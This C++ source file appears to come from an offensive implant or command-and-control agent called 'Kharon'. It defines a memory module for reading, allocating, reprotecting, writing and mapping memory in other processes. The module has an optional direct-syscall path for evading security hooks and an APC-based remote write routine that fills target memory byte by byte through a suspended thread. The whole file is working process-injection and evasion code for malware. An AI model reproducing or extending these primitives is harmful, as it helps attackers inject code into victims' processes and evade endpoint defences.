#include <Kharon.h>

auto DECLFN Memory::Read(
    _In_  PVOID   Base,
    _In_  BYTE*   Buffer,
    _In_  SIZE_T  Size,
    _Out_ SIZE_T* Reads,
    _In_  HANDLE  Handle
) -> BOOL {
    G_KHARON
    return Self->Krnl32.ReadProcessMemory( Handle, Base, Buffer, Size, Reads );
}

auto DECLFN Memory::Alloc(
    _In_ PVOID Base,
    _In_ ULONG Size,
    _In_ ULONG AllocType,
    _In_ ULONG Protect,
    _In_ HANDLE Handle
) -> PVOID {
    G_KHARON
    PVOID BaseAddress = NULL;

    if ( Self->Sys->Enabled ) {
        NTSTATUS Status = 0;
        PVOID    TmpPtr = Base;
        SIZE_T   SizeT  = Size;

        if ( Handle == INVALID_HANDLE_VALUE || !Handle ) Handle = NtCurrentProcess();

        SyscallExec( Sys::Alloc, Status, Handle, &TmpPtr, 0, &SizeT, AllocType, Protect );

        BaseAddress = TmpPtr;
        Self->Usf->NtStatusToError( Status );
    } else {
        if ( Handle ) {
            BaseAddress = Self->Krnl32.VirtualAllocEx( Handle, Base, Size, AllocType, Protect );
        } else {
            BaseAddress = Self->Krnl32.VirtualAlloc( Base, Size, AllocType, Protect );
        }
    }

    return BaseAddress;
}

auto DECLFN Memory::Protect(
    _In_  PVOID  Base,
    _In_  ULONG  Size,
    _In_  ULONG  NewProt,
    _Out_ ULONG* OldProt,
    _In_  HANDLE Handle
) -> BOOL {
    G_KHARON
    BOOL Success = FALSE;

    if ( Self->Sys->Enabled ) {
        NTSTATUS Status = STATUS_UNSUCCESSFUL;

        if ( Handle == INVALID_HANDLE_VALUE || !Handle ) Handle = NtCurrentProcess();

        SyscallExec( Sys::Protect, Status, Handle, Base, Size, NewProt, OldProt );
        Self->Usf->NtStatusToError( Status );

        if   ( Status == STATUS_SUCCESS ) Success = TRUE;
        else   Success = FALSE;
    } else {
        if ( Handle ) {
            Success = Self->Krnl32.VirtualProtectEx( Handle, Base, Size, NewProt, OldProt );
        } else {
            Success = Self->Krnl32.VirtualProtect( Base, Size, NewProt, OldProt );
        }
    }

    return Success;
}

auto DECLFN Memory::WriteAPC(
    _In_ HANDLE Handle,
    _In_ PVOID  Base,
    _In_ BYTE*  Buffer,
    _In_ ULONG  Size
) -> BOOL {
    G_KHARON
    HANDLE      ThreadHandle = NULL;
    NTSTATUS    NtStatus     = STATUS_SUCCESS;

    ULONG ThreadId = 0;
    PVOID Dummy    = (PVOID)1;
    ThreadHandle = Self->Td->Create( Handle, (PVOID)Self->Ntdll.RtlExitUserThread, 0, 0, CREATE_SUSPENDED, &ThreadId );

    if ( Size ) {
        for ( INT i = 0; i < Size; i++ ) {
            NtStatus = Self->Td->QueueAPC( (PVOID)Self->Ntdll.khRtlFillMemory, ThreadHandle, ( Buffer + i ), Dummy, ( Buffer + i ) );
        }
    } else {
        NtStatus = Self->Td->QueueAPC( (PVOID)Self->Ntdll.khRtlFillMemory, ThreadHandle, Buffer, 0, NULL );
    }
   
    if ( NtStatus != STATUS_SUCCESS ) {
        Self->Krnl32.TerminateThread( ThreadHandle, EXIT_SUCCESS );
        Self->Ntdll.NtClose( ThreadHandle );
        return FALSE;
    } else {
        Self->Krnl32.ResumeThread( ThreadHandle );
        Self->Krnl32.WaitForSingleObject( ThreadHandle, INFINITE );
        Self->Ntdll.NtClose( ThreadHandle );
        return TRUE;
    }
}

auto DECLFN Memory::Write(
    _In_ PVOID  Base,
    _In_ BYTE*  Buffer,
    _In_ ULONG  Size,
    _In_ HANDLE Handle
) -> BOOL {
    G_KHARON
    BOOL      Success = FALSE;
    ULONG_PTR Written = 0;

    if ( Self->Sys->Enabled ) {
        NTSTATUS Status = STATUS_UNSUCCESSFUL;

        SyscallExec( Sys::Write, Status, Handle, Base, Buffer, Size, &Written );
        Self->Usf->NtStatusToError( Status );

        if   ( Status == STATUS_SUCCESS ) Success = TRUE;
        else   Success = FALSE;
    } else {
        Success = Self->Krnl32.WriteProcessMemory( Handle, Base, Buffer, Size, &Written );
    }

    return Success;
}

auto DECLFN Memory::Free(
    _In_ PVOID  Base,
    _In_ ULONG  Size,
    _In_ ULONG  FreeType,
    _In_ HANDLE Handle
) -> BOOL {
    G_KHARON
    if ( !Handle ) {
        return Self->Krnl32.VirtualFree( Base, Size, FreeType );
    } else {
        return Self->Krnl32.VirtualFreeEx( Handle, Base, Size, FreeType );
    }
}

auto DECLFN Memory::MapView(
    _In_        HANDLE          SectionHandle,
    _In_        HANDLE          ProcessHandle,
    _Inout_     PVOID           *BaseAddress,
    _In_        ULONG_PTR       ZeroBits,
    _In_        SIZE_T          CommitSize,
    _Inout_opt_ LARGE_INTEGER*  SectionOffset,
    _Inout_     SIZE_T*         ViewSize,
    _In_        SECTION_INHERIT InheritDisposition,
    _In_        ULONG           AllocationType,
    _In_        ULONG           PageProtection
) -> LONG {
    G_KHARON
    LONG RetStatus = STATUS_UNSUCCESSFUL;

    if ( Self->Sys->Enabled ) {
        SyscallExec( Sys::MapView, RetStatus, SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, PageProtection );
    } else {
        RetStatus = Self->Ntdll.NtMapViewOfSection( SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, PageProtection );
    }
    
    return RetStatus;
}

auto DECLFN Memory::CreateSection(
    _Out_    HANDLE*            SectionHandle,
    _In_     ACCESS_MASK        DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ LARGE_INTEGER*     MaximumSize,
    _In_     ULONG              SectionPageProtection,
    _In_     ULONG              AllocationAttributes,
    _In_opt_ HANDLE             FileHandle
) -> LONG {
    G_KHARON
    LONG RetStatus = STATUS_UNSUCCESSFUL;

    if ( Self->Sys->Enabled ) {
        SyscallExec( Sys::CrSectn, RetStatus, SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle );
    } else {
        RetStatus = Self->Ntdll.NtCreateSection( SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle );
    }
    
    return RetStatus;
}